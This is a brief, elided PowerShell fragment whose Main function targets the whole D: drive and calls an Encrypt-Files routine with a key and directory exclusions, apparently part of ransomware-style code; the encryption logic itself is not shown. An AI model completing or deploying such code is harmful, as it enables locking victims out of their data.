...
function Main {
    ...
    # Define the target directory (only the D: drive)
    $TargetDirectories = @("D:\")
    ...
    Encrypt-Files -EncryptionKey $EncryptionKey -TargetDirectories $TargetDirectories -ExcludedDirectories $ExcludedDirectories
